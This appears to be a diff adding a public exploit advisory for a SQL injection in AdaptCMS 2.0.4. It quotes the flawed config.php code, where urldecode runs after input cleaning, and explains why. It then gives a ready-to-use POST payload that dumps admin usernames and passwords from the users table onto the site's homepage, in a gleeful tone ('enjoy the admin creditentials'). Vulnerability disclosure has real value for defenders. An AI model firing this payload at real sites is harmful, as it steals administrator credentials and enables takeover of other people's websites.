@@ -1,0 +1,70 @@
+# Exploit Title: AdaptCMS <= 2.0.4 SQL Injection vulnerability
+# Date: 26/10/2012
+# Exploit Author: Kallimero
+# Vendor Homepage: http://www.adaptcms.com/
+# Software Link: http://www.insanevisions.com/page/3/Downloads/
+# Version: 2.0.4
+# Tested on: Debian
+
+Introduction
+============
+
+As you know, I love fun and tricky SQL injections.
+AdaptCMS is vulnerable to a really unusual one.
+
+
+The vuln
+========
+
+
+First let's see the code :
+
+---------------[config.php]---------------
+
+Line 34 :
+array_map('clean', $_POST);
+
+---------------[config.php]---------------
+
+clean() acts like addslashes.
+
+But a couple of lines after:
+
+---------------[config.php]---------------
+ligne 111:
+
+    mysql_query("INSERT INTO ".$pre."polls VALUES (null,
+'".htmlentities(check($vote[2]))."', '".$vote2."', 'custom_option', '',
+'".htmlentities(urldecode($_POST['question']))."', 1, '".time()."')");
+---------------[config.php]---------------
+
+w00t an SQL injection. $_POST['question'] is urldecoded after the
+superglobal's clean. That's why we can easily inject our SQL request.
+(Without ENT_QUOTES, the simple quote pass through htmlentities() ).
+
+
+The PoC :
+=========
+
+Ok, now we have to add a second INSERT query, to insert a custom choice in
+the poll, which obviously contain the admin creditentials.
+A simple POST http request such as:
+article_id=0&poll_id=1&vote=2&custom=1&question=%2527, 1, 1350677660),
+(null, 0, (select concat(username, 0x3a, password) from adapt_users),
+'option', '', 1, 1337, 1349597648  )-- -
+
+Now check homepage, and enjoy the admin creditentials.
+
+How to Fix ?
+============
+
+There is many SQL injections in this CMS ($_SERVER vars are vulnerables as
+well), and others funkies vulnz.
+changing your cms seems appropriate until they fix thoses issues.
+
+Thanks
+=========
+
+All hwc members : Necromoine, fr0g, AppleSt0rm, St0rn, Zhyar, k3nz0,
+gr4ph0s.
+Please visit : http://www.orgasm.re/
